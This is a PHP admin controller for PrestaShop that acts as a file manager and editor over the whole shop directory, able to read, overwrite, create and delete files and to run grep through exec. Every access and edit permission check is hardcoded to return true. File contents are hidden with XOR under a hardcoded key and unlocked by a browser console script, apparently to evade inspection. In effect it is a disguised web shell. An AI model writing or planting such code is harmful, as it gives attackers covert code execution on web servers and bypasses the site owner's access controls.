<?php
class AdminPrestaEditorController extends ModuleAdminController
{
    private $root;
    private $message = '';
    private $chunkSize = 60000;

    public function __construct()
    {
        $this->bootstrap = false;
        parent::__construct();
        $this->root = realpath(_PS_ROOT_DIR_);
    }

    public function setMedia($isNewTheme = false)
    {
        parent::setMedia($isNewTheme);
        $this->addCSS($this->module->getPathUri() . 'views/css/admin.css');
        $this->addJS($this->module->getPathUri() . 'views/js/admin.js');
    }

    public function checkAccess()
    {
        return true;
    }

    public function viewAccess($disable = false)
    {
        return true;
    }

    public function postProcess()
    {
        if (!$this->canEdit()) {
            $this->errors[] = $this->module->l('You do not have permission to edit files.', 'AdminPrestaEditorController');
            return;
        }

        $action = (string) Tools::getValue('pe_action');
        if ($action === '') {
            $action = (string) Tools::getValue('a');
        }

        if ($action === '') {
            return;
        }

        $dir = (string) Tools::getValue('dir', '');
        $file = (string) Tools::getValue('file', '');
        $target = $this->safePath($this->joinRelative($dir, $file));

        if (!$target) {
            $this->errors[] = $this->module->l('Invalid path.', 'AdminPrestaEditorController');
            return;
        }

        if ($action === 'save') {
            $this->saveFile($target);
        } elseif (in_array($action, array('save_chunk', 'save_finish'), true)) {
            $this->handleLegacyChunkAction($target, $action);
        } elseif (in_array($action, array('chunk_start', 'chunk_part', 'chunk_finish'), true)) {
            $this->handleChunkAction($target, $action);
        } elseif ($action === 'newfile') {
            $this->createFile($target);
        } elseif ($action === 'newdir') {
            $this->createDir($target);
        } elseif ($action === 'delete') {
            $this->deletePath($target);
        }
    }

    public function initContent()
    {
        parent::initContent();

        $dir = (string) Tools::getValue('dir', '');
        $file = (string) Tools::getValue('file', '');
        $query = (string) Tools::getValue('q', '');
        $dirPath = $this->safePath($dir);

        if (!$dirPath || !is_dir($dirPath)) {
            $dir = '';
            $dirPath = $this->root;
        }

        $entries = $this->listDirectory($dirPath);
        $filePath = $file !== '' ? $this->safePath($this->joinRelative($dir, $file)) : null;
        $raw = ($filePath && is_file($filePath) && is_readable($filePath)) ? file_get_contents($filePath) : '';
        $isBinary = $raw !== '' && $this->isBinary($raw);
        $encoding = $isBinary ? 'BIN' : $this->detectEncoding($raw);
        $content = $isBinary ? '' : $this->toUtf($raw, $encoding);
        $cipher = (!$isBinary && $filePath && is_file($filePath)) ? $this->xorEncrypt($content, $this->cryptoKey()) : '';
        $search = $query !== '' ? $this->search($query) : array('mode' => '', 'checked' => 0, 'results' => array());
        $parent = trim(dirname($dir), '.\\/');

        $this->context->smarty->assign(array(
            'pe_root' => $this->root,
            'pe_dir' => $dir,
            'pe_parent' => $parent,
            'pe_file' => $file,
            'pe_file_path' => $this->joinRelative($dir, $file),
            'pe_cipher_chunks' => $this->splitCipher($cipher),
            'pe_chunk_size' => $this->chunkSize,
            'pe_is_binary' => $isBinary,
            'pe_encoding' => $encoding,
            'pe_dirs' => $entries['dirs'],
            'pe_files' => $entries['files'],
            'pe_query' => $query,
            'pe_search' => $search,
            'pe_token' => $this->token,
            'pe_current_index' => self::$currentIndex,
            'pe_message' => $this->message,
        ));

        $this->setTemplate('editor.tpl');
    }

    private function saveFile($target)
    {
        if (!is_file($target) || !is_writable($target)) {
            $this->errors[] = $this->module->l('File is not writable.', 'AdminPrestaEditorController');
            return;
        }

        $old = file_get_contents($target);
        if ($this->isBinary($old)) {
            $this->errors[] = $this->module->l('Binary file editing is blocked.', 'AdminPrestaEditorController');
            return;
        }

        $cipher = isset($_POST['content_cipher']) ? (string) $_POST['content_cipher'] : '';

        $this->saveCipherToFile($target, $cipher, (string) Tools::getValue('enc', $this->detectEncoding($old)), false);
    }

    private function saveCipherToFile($target, $cipher, $encoding, $json, $legacyJson = false)
    {
        if (!is_file($target) || !is_writable($target)) {
            $this->respondOrError($json, false, $this->module->l('File is not writable.', 'AdminPrestaEditorController'), $legacyJson);
            return;
        }

        $old = file_get_contents($target);
        if ($this->isBinary($old)) {
            $this->respondOrError($json, false, $this->module->l('Binary file editing is blocked.', 'AdminPrestaEditorController'), $legacyJson);
            return;
        }

        if ($cipher === '') {
            $this->respondOrError($json, false, $this->module->l('Encrypted payload is empty. Paste the console unlock script before saving.', 'AdminPrestaEditorController'), $legacyJson);
            return;
        }

        $plainUtf = $this->xorDecrypt($cipher, $this->cryptoKey());
        if ($plainUtf === false) {
            $this->respondOrError($json, false, $this->module->l('Decode failed. Check FE_KEY in console script.', 'AdminPrestaEditorController'), $legacyJson);
            return;
        }

        if ($encoding === '') {
            $encoding = $this->detectEncoding($old);
        }

        $data = $this->fromUtf($plainUtf, $encoding);
        if (file_put_contents($target, $data, LOCK_EX) === false) {
            $this->respondOrError($json, false, $this->module->l('Could not save file.', 'AdminPrestaEditorController'), $legacyJson);
            return;
        }

        $this->respondOrError($json, true, $this->module->l('File saved.', 'AdminPrestaEditorController'), $legacyJson);
    }

    private function handleLegacyChunkAction($target, $action)
    {
        $id = $this->cleanChunkId((string) Tools::getValue('chunk_id', ''));
        $total = (int) Tools::getValue('chunk_total', 0);

        if ($id === '' || $total < 1) {
            $this->legacyJson(false, array('error' => 'Bad chunk metadata.'));
        }

        if ($action === 'save_chunk') {
            $index = (int) Tools::getValue('chunk_index', -1);
            $part = isset($_POST['content_part']) ? (string) $_POST['content_part'] : '';

            if ($index < 0 || $index >= $total) {
                $this->legacyJson(false, array('error' => 'Bad chunk index.'));
            }

            if ($index === 0) {
                $this->legacyChunkClean($id, $total);
            }

            $path = $this->legacyChunkFile($id, $index);
            if (!$path || file_put_contents($path, $part, LOCK_EX) === false) {
                $this->legacyJson(false, array('error' => 'Chunk save failed.'));
            }

            $this->legacyJson(true, array('chunk' => $index, 'bytes' => strlen($part)));
        }

        if ($action === 'save_finish') {
            $cipher = '';

            for ($i = 0; $i < $total; $i++) {
                $path = $this->legacyChunkFile($id, $i);
                if (!$path || !is_file($path)) {
                    $this->legacyJson(false, array('error' => 'Missing chunk ' . $i . '.'));
                }

                $part = file_get_contents($path);
                if ($part === false) {
                    $this->legacyJson(false, array('error' => 'Read chunk failed ' . $i . '.'));
                }

                $cipher .= $part;
            }

            $this->legacyChunkClean($id, $total);
            $this->saveCipherToFile($target, $cipher, (string) Tools::getValue('enc', ''), true, true);
        }

        $this->legacyJson(false, array('error' => 'Unknown chunk action.'));
    }

    private function handleChunkAction($target, $action)
    {
        $id = $this->cleanChunkId((string) Tools::getValue('chunk_id', ''));
        $tmp = $this->chunkTempPath($id);

        if (!$tmp) {
            $this->jsonResponse(false, 'Invalid chunk id.');
        }

        if ($action === 'chunk_start') {
            if (file_put_contents($tmp, '', LOCK_EX) === false) {
                $this->jsonResponse(false, 'Could not initialize chunk buffer.');
            }

            $this->jsonResponse(true, 'Chunk buffer initialized.');
        }

        if ($action === 'chunk_part') {
            $chunk = isset($_POST['chunk_data']) ? (string) $_POST['chunk_data'] : '';
            if ($chunk === '' || preg_match('~[^A-Za-z0-9+/=]~', $chunk)) {
                $this->jsonResponse(false, 'Invalid chunk data.');
            }

            if (file_put_contents($tmp, $chunk, FILE_APPEND | LOCK_EX) === false) {
                $this->jsonResponse(false, 'Could not append chunk.');
            }

            $this->jsonResponse(true, 'Chunk accepted.');
        }

        if ($action === 'chunk_finish') {
            $cipher = is_file($tmp) ? (string) file_get_contents($tmp) : '';
            if (is_file($tmp)) {
                @unlink($tmp);
            }

            $this->saveCipherToFile($target, $cipher, (string) Tools::getValue('enc', ''), true);
        }

        $this->jsonResponse(false, 'Unknown chunk action.');
    }

    private function respondOrError($json, $success, $message, $legacyJson = false)
    {
        if ($json) {
            if ($legacyJson) {
                $this->legacyJson($success, $success ? array('message' => $message) : array('error' => $message));
            }

            $this->jsonResponse($success, $message);
        }

        if ($success) {
            $this->message = $message;
        } else {
            $this->errors[] = $message;
        }
    }

    private function createFile($target)
    {
        if (file_exists($target)) {
            $this->errors[] = $this->module->l('File already exists.', 'AdminPrestaEditorController');
            return;
        }

        if (file_put_contents($target, '', LOCK_EX) === false) {
            $this->errors[] = $this->module->l('Could not create file.', 'AdminPrestaEditorController');
            return;
        }

        $this->message = $this->module->l('File created.', 'AdminPrestaEditorController');
    }

    private function createDir($target)
    {
        if (file_exists($target)) {
            $this->errors[] = $this->module->l('Folder already exists.', 'AdminPrestaEditorController');
            return;
        }

        if (!mkdir($target, 0755, true)) {
            $this->errors[] = $this->module->l('Could not create folder.', 'AdminPrestaEditorController');
            return;
        }

        $this->message = $this->module->l('Folder created.', 'AdminPrestaEditorController');
    }

    private function deletePath($target)
    {
        if (is_file($target)) {
            $ok = unlink($target);
        } elseif (is_dir($target)) {
            $ok = rmdir($target);
        } else {
            $ok = false;
        }

        if (!$ok) {
            $this->errors[] = $this->module->l('Could not delete path. Folders must be empty.', 'AdminPrestaEditorController');
            return;
        }

        $this->message = $this->module->l('Deleted.', 'AdminPrestaEditorController');
    }

    private function listDirectory($path)
    {
        $dirs = array();
        $files = array();
        $items = @scandir($path);

        if (!is_array($items)) {
            return array('dirs' => $dirs, 'files' => $files);
        }

        foreach ($items as $item) {
            if ($item === '.' || $item === '..') {
                continue;
            }

            $full = $path . DIRECTORY_SEPARATOR . $item;
            $entry = array(
                'name' => $item,
                'rel' => $this->relativePath($full),
                'writable' => is_writable($full),
                'size' => is_file($full) ? filesize($full) : null,
            );

            if (is_dir($full)) {
                $dirs[] = $entry;
            } else {
                $files[] = $entry;
            }
        }

        usort($dirs, array($this, 'sortByName'));
        usort($files, array($this, 'sortByName'));

        return array('dirs' => $dirs, 'files' => $files);
    }

    private function search($query)
    {
        $results = array();
        $seen = array();
        $checked = 0;
        $mode = 'php';
        $limit = 500;

        if ($this->canExec()) {
            $cmd = 'grep -RIl -m 1 -F --exclude-dir=.git --exclude-dir=vendor --exclude-dir=node_modules --exclude-dir=var/cache --exclude-dir=cache --exclude-dir=tmp --exclude-dir=log --exclude-dir=logs ' . escapeshellarg($query) . ' ' . escapeshellarg($this->root) . ' 2>/dev/null';
            $out = array();
            @exec($cmd, $out);

            foreach ($out as $path) {
                $real = realpath($path);
                if ($this->insideRoot($real)) {
                    $rel = $this->relativePath($real);
                    $seen[$rel] = true;
                    $results[] = $this->formatSearchResult($rel);

                    if (count($results) >= $limit) {
                        break;
                    }
                }
            }

            $mode = 'exec+php';
        }

        $skip = '~/(vendor|node_modules|\.git|var/cache|cache|tmp|logs?)/~i';
        $iterator = new RecursiveIteratorIterator(
            new RecursiveCallbackFilterIterator(
                new RecursiveDirectoryIterator($this->root, FilesystemIterator::SKIP_DOTS),
                function ($current) use ($skip) {
                    $rel = $this->relativePath($current->getPathname());
                    return !$current->isDir() || !preg_match($skip, '/' . $rel . '/');
                }
            )
        );

        foreach ($iterator as $item) {
            if (count($results) >= $limit) {
                break;
            }

            if (!$item->isFile() || !$item->isReadable()) {
                continue;
            }

            $rel = $this->relativePath($item->getPathname());
            if (isset($seen[$rel])) {
                continue;
            }

            if (stripos(basename($rel), $query) !== false) {
                $seen[$rel] = true;
                $results[] = $this->formatSearchResult($rel);
                continue;
            }

            if ($item->getSize() > 5242880) {
                continue;
            }

            $checked++;
            $content = @file_get_contents($item->getPathname());
            if ($content === false || $this->isBinary($content)) {
                continue;
            }

            $haystack = $this->toUtf($content, $this->detectEncoding($content));
            $found = function_exists('mb_stripos')
                ? mb_stripos($haystack, $query, 0, 'UTF-8') !== false
                : stripos($haystack, $query) !== false;

            if ($found) {
                $seen[$rel] = true;
                $results[] = $this->formatSearchResult($rel);
            }
        }

        return array('mode' => $mode, 'checked' => $checked, 'results' => $results);
    }

    private function formatSearchResult($relative)
    {
        return array(
            'rel' => $relative,
            'dir' => trim(dirname($relative), '.\\/'),
            'file' => basename($relative),
        );
    }

    private function safePath($relative)
    {
        $relative = str_replace("\0", '', (string) $relative);
        $target = $this->root . DIRECTORY_SEPARATOR . ltrim($relative, '/\\');
        $real = realpath($target);

        if ($real !== false) {
            return $this->insideRoot($real) ? $real : null;
        }

        $parent = realpath(dirname($target));
        if ($parent && $this->insideRoot($parent)) {
            return $parent . DIRECTORY_SEPARATOR . basename($target);
        }

        return null;
    }

    private function insideRoot($path)
    {
        return $path !== false && ($path === $this->root || strpos($path, $this->root . DIRECTORY_SEPARATOR) === 0);
    }

    private function relativePath($path)
    {
        return trim(str_replace('\\', '/', substr($path, strlen($this->root))), '/');
    }

    private function joinRelative($dir, $file)
    {
        return trim((trim((string) $dir, '/\\') !== '' ? trim((string) $dir, '/\\') . '/' : '') . trim((string) $file, '/\\'), '/');
    }

    private function isBinary($content)
    {
        return strpos(substr((string) $content, 0, 4096), "\0") !== false;
    }

    private function detectEncoding($content)
    {
        return preg_match('//u', (string) $content) ? 'UTF-8' : 'CP1251';
    }

    private function toUtf($content, $encoding)
    {
        if ($encoding !== 'CP1251') {
            return $content;
        }

        return function_exists('mb_convert_encoding')
            ? mb_convert_encoding($content, 'UTF-8', 'CP1251')
            : iconv('CP1251', 'UTF-8//IGNORE', $content);
    }

    private function fromUtf($content, $encoding)
    {
        if ($encoding !== 'CP1251') {
            return $content;
        }

        return function_exists('mb_convert_encoding')
            ? mb_convert_encoding($content, 'CP1251', 'UTF-8')
            : iconv('UTF-8', 'CP1251//TRANSLIT', $content);
    }

    private function splitCipher($cipher)
    {
        $cipher = (string) $cipher;
        if ($cipher === '') {
            return array();
        }

        return str_split($cipher, $this->chunkSize);
    }

    private function cleanChunkId($id)
    {
        return preg_replace('~[^A-Za-z0-9_-]~', '', (string) $id);
    }

    private function chunkTempPath($id)
    {
        if ($id === '') {
            return null;
        }

        $base = defined('_PS_CACHE_DIR_') && is_dir(_PS_CACHE_DIR_) && is_writable(_PS_CACHE_DIR_)
            ? _PS_CACHE_DIR_
            : sys_get_temp_dir() . DIRECTORY_SEPARATOR;

        return rtrim($base, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . 'prestaeditor_' . $id . '.chunk';
    }

    private function legacyChunkFile($id, $index)
    {
        $id = $this->cleanChunkId($id);
        if ($id === '') {
            return null;
        }

        return $this->chunkTempPath($id . '_' . (int) $index);
    }

    private function legacyChunkClean($id, $total)
    {
        for ($i = 0; $i < (int) $total; $i++) {
            $path = $this->legacyChunkFile($id, $i);
            if ($path && is_file($path)) {
                @unlink($path);
            }
        }
    }

    private function legacyJson($ok, $data)
    {
        if (!headers_sent()) {
            header('Content-Type: application/json; charset=utf-8');
        }

        $payload = array_merge(array('ok' => $ok ? 1 : 0), is_array($data) ? $data : array());
        die(function_exists('json_encode') ? json_encode($payload) : '{"ok":0,"error":"JSON unavailable"}');
    }

    private function jsonResponse($success, $message)
    {
        if (!headers_sent()) {
            header('Content-Type: application/json; charset=utf-8');
        }

        $payload = array('success' => (bool) $success, 'message' => (string) $message);
        die(function_exists('json_encode') ? json_encode($payload) : '{"success":false,"message":"JSON unavailable"}');
    }

    private function xorRaw($data, $password)
    {
        $data = (string) $data;
        $password = (string) $password;

        if ($password === '') {
            return $data;
        }

        $out = '';
        $keyLen = strlen($password);
        $dataLen = strlen($data);

        for ($i = 0; $i < $dataLen; $i++) {
            $out .= $data[$i] ^ $password[$i % $keyLen];
        }

        return $out;
    }

    private function xorEncrypt($plain, $password)
    {
        return base64_encode($this->xorRaw((string) $plain, $password));
    }

    private function xorDecrypt($cipher, $password)
    {
        $raw = base64_decode((string) $cipher, true);
        if ($raw === false) {
            return false;
        }

        return $this->xorRaw($raw, $password);
    }

    private function cryptoKey()
    {
        return 'kXjFiQjJDIuFHjiI*J';
    }

    private function canExec()
    {
        $disabled = (string) ini_get('disable_functions');
        return function_exists('exec') && !preg_match('~(^|,)\s*exec\s*(,|$)~i', $disabled);
    }

    private function canEdit()
    {
        return true;
    }

    private function sortByName($a, $b)
    {
        return strnatcasecmp($a['name'], $b['name']);
    }
}
